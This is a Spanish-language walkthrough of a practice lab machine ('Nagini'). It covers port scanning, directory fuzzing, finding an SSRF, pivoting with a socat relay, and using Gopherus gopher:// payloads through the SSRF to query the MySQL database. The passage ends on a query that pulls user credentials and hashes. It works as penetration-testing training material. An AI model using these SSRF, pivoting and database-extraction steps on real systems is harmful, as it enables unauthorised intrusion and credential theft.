[[10.10.0.4 (Aragog)]]

`#CSRF` `#HTTP3`
Hacemos un scaneo con [[NMAP]] para ver los puertos abiertos:
`nmap -sT -Pn --top-ports 500 --open -T5 -v -n 10.10.0.5`

```python
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Podemos agilizar la búsqueda mas si usamos un secuenciador junto con xargs
`seq 1 65535 | xargs -P 700 -I {} nmap -sT -Pn -p{} -open -T5 -n -v 10.10.0.5 | grep "tcp open"`

Navegaremos a la pagina web que nos muestra que esta levantada en el puerto `80`
Vemos información sobre la web con la herramienta con [[WHATWEB]]
`whatweb http://10.10.0.5/`
```python
http://10.10.0.5/ [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.0.5]
```

Vamos a hacer fuzzing sobre la web con la herramienta [[GOBUSTER]]
`gobuster dir -u http://10.10.0.5/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 20 -x html,php,txt`
Este nos encontrara los siguientes ficheros
`index.html`
`/joomla`
`note.txt` con el siguiente contenido:
```txt
Hello developers!!


I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
All developers are requested to visit the server regularly for checking latest announcements.


Regards,
site_amdin
```

Esto nos indica que se esta usando `HTTP3` que es la tercera versión de HTTP utiliza un puerto UDP
Usaremos la herramienta de quiche con la tool de `./http3-client` como en esta caso no conseguía utilizarla seguí el siguiente paso del video en el que se descubre la ruta:
`/internalResourceFeTcher.php` así que accedemos a ella desde el navegador

Vemos que la URL esta en método get, así que usando la opción 
`?url=` podremos traer al navegador actual por ejemplo llamar a `http://localhost` nos muestra la web del localhost, al igual que podemos cargar la web de la maquina [[10.10.0.4 (Aragog)]] aunque no cargue la imagen. Esto acontece un SSRF (Server Side Request Forgery) y lo podemos usar para enumerar los puertos y servicios internos de la maquina.

Para poder tener conectividad con nuestra maquina atacante lo que haremos sera descargar `socat` y nos lo trasferiremos a la maquina intermedia [[192.168.1.23 (Aragog)]] [[10.10.0.4 (Aragog)]]
Le daremos permisos de ejecución y ejecutaremos la herramienta de la siguiente forma:
`./socat TCP-LISTEN:4343,fork TCP:192.168.1.19:80`
Estamos indicando que todo lo que se pida por el puerto 4343 lo envié a través de la ip de [[192.168.1.23 (Aragog)]] por el puerto 80

En nuestra maquina atacante levantaremos un servidor con python y desde la web de la maquina [[10.10.0.5(Nagini)]] en la url encontrada probamos a acceder a la maquina [[10.10.0.4 (Aragog)]] por el puerto 4343 que es el que le hemos indicado en socat

Ahora desde dentro de la url como tenemos levantado nuestro servidor de python y habilitado todo lo que es el pivoting y el renvió de paquetes intentamos acceder por la url a u8n archivo que creemos en nuestra maquina atacante que se llame `pwned.php` y ver si lo interpreta.

Como no lo interpreta, también encontramos el directorio `/joomla` así que navegamos a el. Usaremo0s la herramienta joomscan para hacer enumeración de vulnerabilidades.
`joomscan -u http://10.10.0.5/joomla/`

La respuesta de la ejecución de esta herramienta nos muestra que esta expuesta la interfaz del administrador `http://10.10.0.5/joomla/administrator/`

También nos encuentra un archivo .bak `http://10.10.0.5/joomla/configuration.php.bak`
Nos lo intentamos descargar para ver su contenido con: `curl -s -X GET http://10.10.0.5/joomla/configuration.php.bak > configuration.php`

Vemos que es un archivo de configuración de la base de datos
Usaremos `gopher` que te permite enumerar bases de datos desde `gopher://` 
Nos clonaremos el repositorio: `git clone https://github.com/tarunkant/Gopherus`
Le damos permisos de ejecución al archivo .py y luego hacemos un enlace simbólico para poder llamarlo desde cualquier parte del sistema: `ln -sf $(pwd)/gopherus.py /usr/local/bin/gopherus`

Ejecutaremos la herramienta con:
`gopherus --exploit mysql` introducimos el nombre de usuario que hemos encontrado en el archivo .bak
Ahora deberemos indicar que QUERY queremos ejecutar por ejemplo, enumerar las bases de datos:
`SHOW databases;`
Y nos muestra una URL a la que podemos acceder desde el navegado donde esta la web que nos permitía inyectar URL en `http://10.10.0.5/internalResourceFeTcher.php`
Tendremos que recargar la pagina varias veces hasta que nos muestre la información, vemos que hay una base de datos llamada joomla, así que ahora enumeraremos las tablas de esa base de datos.
Volvemos a usar el usuario encontrado pero en la QUERY usaremos: `USE joomla; show tables;`

La URL que nos muestra, la volvemos a copiar y la metemos en la pagina de `http://10.10.0.5/internalResourceFeTcher.php` y vemos que hay una tabla de usuarios `joomla_users`

Ahora enumeraremos esa tabla con la misma herramienta y la QUERY: `USE joomla; describe joomla_users;`, vemos que hay columnas de usuario, mail, password, etc...

Nuestra nueva QUERY será: `USE joomla; select name,username,email,password from joomla_users;`
















